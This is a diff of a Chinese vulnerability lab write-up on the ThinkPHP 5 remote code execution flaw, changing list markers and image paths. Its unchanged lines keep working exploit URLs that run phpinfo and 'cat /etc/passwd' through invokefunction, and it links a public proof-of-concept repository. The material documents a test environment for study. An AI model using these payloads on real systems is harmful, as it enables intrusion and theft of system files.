@@ -6,9 +6,9 @@ ThinkPHP 是一款运用极广的 PHP 开发框架。其版本 5 中，由于没
 
 参考链接：
 
-- http://www.thinkphp.cn/topic/60400.html
-- http://www.thinkphp.cn/topic/60390.html
-- https://xz.aliyun.com/t/3570
+* http://www.thinkphp.cn/topic/60400.html
+* http://www.thinkphp.cn/topic/60390.html
+* https://xz.aliyun.com/t/3570
 
 ## 环境搭建
 
@@ -24,7 +24,7 @@ docker-compose up -d
 
 直接访问 `http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`，即可执行 phpinfo：
 
-![image-20220302150446791](images/202203021504893.png)
+![image-20220302150446791](../.gitbook/assets/202203021504893.png)
 
 执行系统命令：
 
@@ -32,8 +32,8 @@ docker-compose up -d
 http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/etc/passwd
 ```
 
-![image-20220302150508363](images/202203021505433.png)
+![image-20220302150508363](../.gitbook/assets/202203021505433.png)
 
 ## 开源 POC/EXP
 
-- https://github.com/sukabuliet/ThinkphpRCE
+* https://github.com/sukabuliet/ThinkphpRCE
